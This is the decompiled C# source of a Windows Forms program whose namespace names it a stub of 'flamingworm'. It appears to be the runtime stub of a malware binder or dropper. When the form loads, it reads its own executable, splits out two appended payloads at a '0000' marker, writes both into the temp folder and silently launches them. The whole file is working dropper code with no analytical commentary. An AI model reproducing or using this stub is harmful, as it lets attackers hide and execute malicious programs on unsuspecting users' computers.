using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace stub_of_flamingworm;

[DesignerGenerated]
public class Form1 : Form
{
	private static List<WeakReference> __ENCList = new List<WeakReference>();

	private IContainer components;

	[DebuggerNonUserCode]
	public Form1()
	{
		((Form)this).add_Load((EventHandler)Form1_Load);
		lock (__ENCList)
		{
			__ENCList.Add(new WeakReference(this));
		}
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if ((disposing && components != null) ? true : false)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		components = new Container();
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_Text("Form1");
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		int try0001_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		string[] array = default(string[]);
		string text = default(string);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0001_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = -2;
					goto IL_0009;
				case 392:
					{
						num2 = num;
						if (num3 > -2)
						{
							switch (num3)
							{
							case 1:
								break;
							default:
								goto end_IL_0001;
							}
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0009;
						case 3:
							goto IL_001c;
						case 4:
							goto IL_002c;
						case 5:
							goto IL_0041;
						case 6:
							goto IL_0055;
						case 7:
							goto IL_0066;
						case 8:
							goto IL_0081;
						case 9:
							goto IL_0097;
						case 10:
							goto IL_00ac;
						case 11:
							goto IL_00c8;
						case 12:
							goto IL_00df;
						case 13:
							goto IL_00f4;
						case 14:
							goto IL_010b;
						case 15:
							goto end_IL_0001_2;
						default:
							goto end_IL_0001;
						case 16:
							goto end_IL_0001_3;
						}
						goto default;
					}
					IL_010b:
					num = 14;
					Process.Start(Path.GetTempPath() + array[4]);
					break;
					IL_00f4:
					num = 13;
					Process.Start(Path.GetTempPath() + array[3]);
					goto IL_010b;
					IL_0009:
					num = 2;
					FileSystem.FileOpen(1, Application.get_ExecutablePath(), (OpenMode)32, (OpenAccess)1, (OpenShare)3, -1);
					goto IL_001c;
					IL_001c:
					num = 3;
					text = Strings.Space(checked((int)FileSystem.LOF(1)));
					goto IL_002c;
					IL_002c:
					num = 4;
					FileSystem.FileGet(1, ref text, -1L, false);
					goto IL_0041;
					IL_0041:
					num = 5;
					FileSystem.FileClose(new int[1] { 1 });
					goto IL_0055;
					IL_0055:
					num = 6;
					array = Strings.Split(text, "0000", -1, (CompareMethod)0);
					goto IL_0066;
					IL_0066:
					num = 7;
					FileSystem.FileOpen(3, Path.GetTempPath() + array[3], (OpenMode)32, (OpenAccess)3, (OpenShare)(-1), -1);
					goto IL_0081;
					IL_0081:
					num = 8;
					FileSystem.FilePut(3, array[1], -1L, false);
					goto IL_0097;
					IL_0097:
					num = 9;
					FileSystem.FileClose(new int[1] { 3 });
					goto IL_00ac;
					IL_00ac:
					num = 10;
					FileSystem.FileOpen(5, Path.GetTempPath() + array[4], (OpenMode)32, (OpenAccess)3, (OpenShare)(-1), -1);
					goto IL_00c8;
					IL_00c8:
					num = 11;
					FileSystem.FilePut(5, array[2], -1L, false);
					goto IL_00df;
					IL_00df:
					num = 12;
					FileSystem.FileClose(new int[1] { 5 });
					goto IL_00f4;
					end_IL_0001_2:
					break;
				}
				num = 15;
				((Form)this).Close();
				ProjectData.EndApp();
				break;
				end_IL_0001:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0001_dispatch = 392;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0001_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}
}
